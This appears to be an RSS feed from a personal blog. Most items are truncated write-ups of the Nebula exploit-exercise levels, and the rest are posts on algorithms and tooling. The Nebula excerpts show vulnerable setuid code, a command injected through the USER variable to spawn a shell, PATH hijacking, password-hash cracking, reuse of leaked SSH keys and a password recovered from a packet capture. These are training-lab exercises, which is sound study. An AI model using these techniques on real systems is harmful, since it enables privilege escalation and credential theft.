 Only a value that has been proposed may be chosen Only a single value is chosen, and A process never learns that a value has been chosen unless it acutally has been  three agents: proposers(P), acceptors(A), and learners(L).
use customary asynchronous, non-Byzantine model, in which:
 Agents operate at arbitrary speed, may fail by stopping, and may restart Messages can take arbitrarily long to be delivered, can be duplicated, and can be lost, but they are not corrupted.</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 13</title>
      <link>http://jhan.xyz/post/2014-01-26-nebula-level13/</link>
      <pubDate>Sun, 26 Jan 2014 21:54:12 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-26-nebula-level13/</guid>
      <description>About There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
To do this level, log in as the level13 account with the password level13 . Files for this level can be found in /home/flag13.
Source code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;string.h&amp;gt; #define FAKEUID 1000 int main(int argc, char **argv, char **envp) { int c; char token[256]; if(getuid() !</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 12</title>
      <link>http://jhan.xyz/post/2014-01-26-nebula-level12/</link>
      <pubDate>Sun, 26 Jan 2014 20:12:53 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-26-nebula-level12/</guid>
      <description>About There is a backdoor process listening on port 50001.
To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12.
Source code -- /home/flag12/flag12.lua local socketlocal socket = require(&amp;quot;socket&amp;quot;) local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001)) function hash(password) prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;) data = prog:read(&amp;quot;*all&amp;quot;) prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(&amp;quot;Password: &amp;quot;) client:settimeout(60) local line, err = client:receive() if not err then print(&amp;quot;trying &amp;quot; .</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 11</title>
      <link>http://jhan.xyz/post/2014-01-26-nebula-level11/</link>
      <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-26-nebula-level11/</guid>
      <description>About The /home/flag11/flag11 binary processes standard input and executes a shell command.
There are two ways of completing this level, you may wish to do both :-)
To do this level, log in as the level11 account with the password level11 . Files for this level can be found in /home/flag11.
Source code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; /* * Return a random, non predictable file, and return the file descriptor for it.</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 10</title>
      <link>http://jhan.xyz/post/2014-01-25-nebula-level10/</link>
      <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-25-nebula-level10/</guid>
      <description>About The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.
Source Code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;errno.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { char *file; char *host; if(argc &amp;lt; 3) { printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(&amp;quot;Connecting to %s:18211 .</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 09</title>
      <link>http://jhan.xyz/post/2014-01-24-nebula-level09/</link>
      <pubDate>Fri, 24 Jan 2014 11:43:40 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-24-nebula-level09/</guid>
      <description>About There&amp;rsquo;s a C setuid wrapper for some vulnerable PHP code&amp;hellip;
To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.
Source code &amp;lt;?php function spam($email) { $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email); $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email); return $email; } function markup($filename, $use_me) { $contents = file_get_contents($filename); $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents); $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents); $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents); return $contents; } $output = markup($argv[1], $argv[2]); print $output; ?</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 08</title>
      <link>http://jhan.xyz/post/2014-01-24-nebula-level08/</link>
      <pubDate>Fri, 24 Jan 2014 11:43:31 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-24-nebula-level08/</guid>
      <description>About World readable files strike again. Check what that user was up to, and use it to log into flag08 account.
To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.
Solution 用*level08*登录之后回看到一个名为*capture.pcap*的文件，记录了一次抓包的结果。把这个文件scp出来之后分析，中间有一处显示：
Password: backdoor...00Rm8.ate  看样子是*flag08*用户的密码，不过用过十六进制编辑器的小伙伴们都知道，&amp;rdquo;.&amp;ldquo;可能是任何空白字符，不能简单的认为密码就是“backdoor&amp;hellip;00Rm8.ate”。查看这部分的十六进制，发现“.”对应的是0x7f，查了一下ASCII码表发现0x7f是DEL，也就是删除键，所以实际的密码应该是“backd00Rm8.ate”。
还挺会玩儿的，拿0替代了o……</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 07</title>
      <link>http://jhan.xyz/post/2014-01-13-nebula-level07/</link>
      <pubDate>Mon, 13 Jan 2014 15:49:10 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-13-nebula-level07/</guid>
      <description>About The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
Source Code #!/usr/bin/perl use CGI qw{param}; print &amp;quot;Content-type: text/html\n\n&amp;quot;; sub ping { $host = $_[0]; print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;); @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`; foreach $line (@output) { print &amp;quot;$line&amp;quot;; } print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;); } # check if Host set.</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 06</title>
      <link>http://jhan.xyz/post/2014-01-13-nebula-level06/</link>
      <pubDate>Mon, 13 Jan 2014 15:48:33 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-13-nebula-level06/</guid>
      <description>About The flag06 account credentials came from a legacy unix system.
To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06.
Check out /etc/passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh  Decrypted with John the Ripper, and got the login password.
reference</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 05</title>
      <link>http://jhan.xyz/post/2014-01-13-nebula-level05/</link>
      <pubDate>Mon, 13 Jan 2014 14:16:44 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-13-nebula-level05/</guid>
      <description>About Check the flag05 home directory. You are looking for weak directory permissions
To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05.
Solution Copy the file /home/flag05/.backup/backup-19072011.tgz in to home directory of level05.
extract it
level05@nebula:~$ tar -xvf backup-19072011.tgz .ssh/ .ssh/id_rsa.pub .ssh/id_rsa .ssh/authorized_keys  So this should be the id key of user flag05, try to use ssh to login with user flag05 without a password, and it successed.</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 04</title>
      <link>http://jhan.xyz/post/2014-01-10-nebula-level04/</link>
      <pubDate>Fri, 10 Jan 2014 20:43:48 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-10-nebula-level04/</guid>
      <description>About This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
To do this level, log in as the level04 account with the password level04 . Files for this level can be found in /home/flag04.
Solution Source code for /home/flag04/flag04 is
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; int main(int argc, char **argv, char **envp) { char buf[1024]; int fd, rc; if(argc == 1) { printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]); exit(EXIT_FAILURE); } if(strstr(argv[1], &amp;quot;token&amp;quot;) !</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 03</title>
      <link>http://jhan.xyz/post/2014-01-09-nebula-level03/</link>
      <pubDate>Thu, 09 Jan 2014 17:03:25 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-09-nebula-level03/</guid>
      <description>About Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.
To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.
Solution No source code is available for this level, but there is a shell script in the home directory of user flag03</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level02</title>
      <link>http://jhan.xyz/post/2014-01-09-nebula-level02/</link>
      <pubDate>Thu, 09 Jan 2014 15:13:38 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-09-nebula-level02/</guid>
      <description>基本过程与level01一样，先看/home/flag02/flag02的源代码：
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv, char **envp) { char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;)); printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer); system(buffer); }  先通过$USER构建了一个字符串，然后执行该字符串。比如正常情况下
buffer=&amp;quot;/bin/echo level02 is cool&amp;quot;  在这里echo程序用了绝对路径，不过那个$USER明显是让我们加以利用的……在本例中echo程序是动不了的了，那怎么能执行其他的命令呢？也很简单，Linux本来就可以在一行中执行多条语句，这里选择用“;”来分割。如下修改$USER
USER=&amp;quot;haha; /bin/bash&amp;quot;  其实这里完全可以使用/bin/getflag的，就直接过掉了，不过每次都这么玩儿没意思，试试开个console吧。修改之后执行：
~ $ /home/flag02/flag02 about to call system(&amp;quot;/bin/echo haha; /bin/bash is cool&amp;quot;) haha /bin/bash: is: No such file or directory  擦，bash执行的时候把后边的is cool当成参数了，这也简单，再次祭出“;”把bash跟他们分开</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level01</title>
      <link>http://jhan.xyz/post/2014-01-09-nebula-level01/</link>
      <pubDate>Thu, 09 Jan 2014 14:54:40 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-09-nebula-level01/</guid>
      <description>有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv, char **envp) { gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;); }  前边代码的作用在上一篇博客中提到了，为了使当前的effective uid为flag01，所以system这一句是以flag01这个user的权限执行的。通过/usr/bin/env程序执行了echo程序，在屏幕上打印“and now what？”，不过在执行echo这个命令的时候没有使用绝对路径，使得通过修改$PATH来执行任意程序成为了可能。在本例中，通过修改$PATH和重定向来直接以flag01用户执行/bin/getflag程序：
~ $ export PATH=/home/level01:$PATH ~ $ ln -s /bin/getflag /home/level01/echo ~ $ /home/flag01/flag01 You have successfully executed getflag on a target account  这样就可以了。通过重定向其他程序为/home/level01/echo，可以用flag01用户执行任意程序。</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level00</title>
      <link>http://jhan.xyz/post/2014-01-08-nebula-level00/</link>
      <pubDate>Wed, 08 Jan 2014 19:19:58 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-08-nebula-level00/</guid>
      <description>之前斌哥推荐了一个Exploit Exercise，上面有一些小练习，最近决定去做一做玩玩。网站上练习的话分为以下几个子项目：
 Nebula，simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions Protostar，basic memory corruption issues such as buffer overflows, format strings and heap exploitation under &amp;ldquo;old-style&amp;rdquo; Linux system that does not have any form of modern exploit mitigiation systems enabled Fusion, continues the memory corruption, format strings and heap exploitation but this time focusing on more advanced scenarios and modern protection systems  安装 去网站上下载Nebula的镜像，看很多人的评论之前提供的是OVA镜像，直接加载就行，现在提供的bin是liveCD格式的，有各种问题。我在安装的时候也出现了问题，在vmware中启动图形界面会报“piix4 smbus not enabled”的错误，看了看网上的各种解决方案基本上是在modprobe中禁用掉i2c_piix4这个module，不过对于安装过程中出问题没有找到更好地解决方法，反正这些练习也不需要在本地些什么代码，所以就选择直接从liveCD启动，然后terminal里去做了。</description>
    </item>
    
    <item>
      <title>Kosaraju算法——关于图的后序遍历的特征</title>
      <link>http://jhan.xyz/post/2014-01-04-postordering-dfs/</link>
      <pubDate>Sat, 04 Jan 2014 19:27:50 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-04-postordering-dfs/</guid>
      <description>Kosaraju算法是一种常见的求图的强联通分量的算法，该算法先从任意结点开始对原图G进行一次DFS后序遍历，之后依据第一次DFS的结果的反向序列（即根据reverse postordering），对原图的反向图G&amp;rsquo;进行前序的DFS。在第二次DFS中，每个联通分量即为一个强联通分量。
算法是很简单，不过之前并没有完全搞明白，昨天晚上仔细想了下，总算弄明白了。事实上后序遍历一个图得到的序列包含了原图重要的结构信息，正是这些结构信息保证了第二次DFS能得到正确的结果。
先简单阐述结论，第一次后序遍历是为了保证，在第二次对反向图的前序遍历中，先访问到的强联通分量不指向任何未被访问到的强联通分量。
下面将简单证明一下。
假设一个图G，共有m个结点V1, V2, ..., Vm，G的一个强联通分量为*S*，包含n个结点。从任意结点开始对G进行一次后序遍历，得到后序序列A1, A2, ..., Am。在这个序列中，我们可以找到这样一个最短的连续子序列Ai, Ai+1, ..., Aj，使得*S*中所有的结点都包含在该子序列中，那么该子序列将满足如下两点：
 结点集合{A1, A2, ..., Ai-1}不指向*S*（即不存在一条边从{A1, A2, ..., Ai-1}中任意一个结点指向*S*中的某个结点） *S*不指向结点集合{Aj+1, Aj+2, ..., Am}  这两点非常容易证明，我们知道*S*是一个强联通分量，*S*作为一个整体与其他任意的结点都只有单向的边，即对于任意不属于*S*的结点*v*，不可能同时存在*v*指向*S*的边和*S*指向*v*的边（否则强联通分量就是{S+v}了）。集合{A1, A2, ..., Ai-1}和集合{Aj+1, Aj+2, ..., Am}中的所有结点都满足这一条件。
我们先证明第一点，对于集合{A1, A2, ..., Ai-1}中任意结点*Vk*（1&amp;lt;=k&amp;lt;=i-1），如果*Vk*指向*S*，那么当访问到*Vk*的时候必然会遍历*Vk*指向*S*的那条边（注意如果*Vk*指向*S*，那么就不可能有*S*指向*Vk*的边了），而*S*是一个强联通分量，访问其中任一结点最终都会访问到整个*S*，那么在后序序列中，*Vk*必然出现在包含*S*的子序列的后边，这与*Vk*属于{A1, A2, ..., Ai-1}这一条件相左，因此这种情况是不可能出现的。
利用相似的思想我们可以证明第二点。
那么这两条性质对于Kosaraju算法中的第二次DFS有什么作用的？不要忘记在Kosaraju算法中还有重要的一步，那就是第二次DFS是在原始图的逆向图（结点与原图相同，边与原图的边方向相反）上进行的！所以我们第一次DFS得到的后序序列，在反向图上就会呈现出相反的特性：
 S不指向结点集合{A1, A2, ..., Ai-1} 结点集合{Aj+1, Aj+2, ..., Am}不指向S  考虑结点*Am*所在的强联通分量，假设包含该强联通分量的最短子序列为Ak, Ak+1, ..., Am，那么套用刚刚提到的特性1，我们有如下结论：在反向图中，*Am*所在的强联通分量不指向任何其他的强联通分量。所以从*Am*开始对反向图进行一次前序遍历，所有能访问到的结点均属于同一个强联通分量。接下来就是一个递归的过程了，标记了*Am*所在的强联通分量中所有的结点之后，剩下的序列满足与原始序列同样的性质，因此只需要逆着后序序列依次对反向图进行前序遍历，就能求得所有的强联通分量。因此，在第二次DFS的过程中，每访问到一个新的强联通分量，总能保证这个强联通分量没有指向未访问的强联通分量的边。
突然有个想法，可惜时间不够了，先留着吧：这个算法是不是可以用来做拓扑排序？</description>
    </item>
    
    <item>
      <title>Markdown Notes</title>
      <link>http://jhan.xyz/post/2014-01-03-markdown-notes/</link>
      <pubDate>Fri, 03 Jan 2014 14:16:17 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-01-03-markdown-notes/</guid>
      <description>&lt;h2 id=&#34;header&#34;&gt;Header&lt;/h2&gt;

&lt;h1 id=&#34;header-1&#34;&gt;Header 1&lt;/h1&gt;

&lt;h1 id=&#34;header-1-1&#34;&gt;Header 1&lt;/h1&gt;

&lt;h2 id=&#34;header-2&#34;&gt;Header 2&lt;/h2&gt;

&lt;h2 id=&#34;header-2-1&#34;&gt;Header 2&lt;/h2&gt;

&lt;h3 id=&#34;header-3&#34;&gt;Header 3&lt;/h3&gt;

&lt;h4 id=&#34;header-4&#34;&gt;Header 4&lt;/h4&gt;

&lt;h5 id=&#34;header-5&#34;&gt;Header 5&lt;/h5&gt;

&lt;p&gt;Normal Content&lt;/p&gt;

&lt;p&gt;Source Code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Header 1

Header 1
=====

## Header 2

Header 2
-----

### Header 3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>变种2-SUM问题——优化O(n)算法中的常数 </title>
      <link>http://jhan.xyz/post/2013-08-19-two-sum-variant/</link>
      <pubDate>Mon, 19 Aug 2013 16:46:00 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2013-08-19-two-sum-variant/</guid>
      <description>Algorithms: Design and Analysis, Part 1 这门课的第六个编程作业的第一道题，之前的编程作业题都比较直观，而这一题需要用到一点简单的优化，相比其他的题目有意思多了。
题目描述： 　输入文件每一行有一个数字（可能有重复），在这所有的数字中，任选不想等的两个数字 x 和 y ，并令 t=x+y，求问在 [-10000, 10000] 区间中存在多少这样的 t 。
Solution： 　这个题目的难度在于输入数据的规模，也就是文件行数（输入数字数）n，网站给出的输入文件有 100w 行，其中不重复的数字也有 99.9w 多个，如果采用最暴力的二重循环枚举的计算方法， n2 的复杂度足以让你在等待运行结果的时间里来趟港澳台自由行了。
　这个 O(n2) 的算法可以很简单的优化为一个 O(n) 的算法：
for each input x { for t in -10000..10000 { y = t - x if y exists in the input { add t to result list } } }  　由于哈希查询的复杂度是 1，所以整个算法的操作复杂度是 20000*n，是一个 O(n) 的算法。试着运行一下，发现这个算法需要预计12个小时才能运行完成，同 O(n2) 的暴力算法一样都是令人难以接受的。</description>
    </item>
    
    <item>
      <title>Install SimpleScalar on Ubuntu 10.10 with Gcc-4.4</title>
      <link>http://jhan.xyz/post/2011-04-19-install-simplescalar/</link>
      <pubDate>Tue, 19 Apr 2011 18:36:02 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2011-04-19-install-simplescalar/</guid>
      <description>The project 1 of computer architecture is based on SimplesSalar3.0, and it is recommended to finished this project on Redhat 9, otherwise there would be some version problems. But I am used to writing code in my ubuntu and do not wanna reset up my whole development environment on Redhat. BTW, installing a new system is rather troublesome even on vm, I decided to install SimplesSalar on my ubuntu(it turns out to be much more troublesome than installing a new one…)</description>
    </item>
    
  </channel>
</rss>